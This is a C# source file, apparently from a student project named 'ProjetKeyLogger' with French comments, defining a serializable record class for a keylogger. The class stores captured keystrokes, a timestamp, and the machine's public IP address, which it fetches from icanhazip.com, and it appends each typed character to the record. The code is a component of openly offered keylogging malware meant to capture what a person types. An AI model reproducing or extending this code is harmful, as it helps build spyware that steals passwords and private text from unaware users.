using System;
using System.Net;

namespace ProjetKeyLogger
{
    [Serializable]
    public class Enregistrement
    {
        //Contenu de l'enregistrement courrant
        private string contenu;
        private string date;
        private string adresse_ip_publique;

        //proprieté en lecture / ecriture
        public string Contenu
        {
            get
            {
                return contenu;
            }
            set
            {
                contenu = value;
            }
        }
        //proprieté en lecture / ecriture
        public string Date
        {
            get
            {
                return date;
            }
            set
            {
                date = value;
            }
        }

        //proprieté en lecture / ecriture
        public string Adresse_Ip_Publique
        {
            get
            {
                adresse_ip_publique = adresseIpPublique();
                return adresse_ip_publique;
            }
            set
            {
                adresse_ip_publique = value;
            }
        }

        //Renvoit la date et l'heure courrante
        public void dateTimeNow()
        {
            //Date actuelle
            DateTime thisDay = DateTime.Now;

            //retourne la date sous forme de chaine
            date = thisDay.ToString();
        }

        //Renvoie l'adresse IP publique
        private String adresseIpPublique()
        {
            //Retourne l'adresse IP publique
            return new WebClient().DownloadString("http://icanhazip.com");
        }

        //Fonction qui concatene la derniere touche tapé au clavier , au contenu de l'enregistrement
        public void ajouterContenu(char caractere)
        {
            //Ajout du caracter au contenu du text
            contenu += caractere;
        }

    }
}
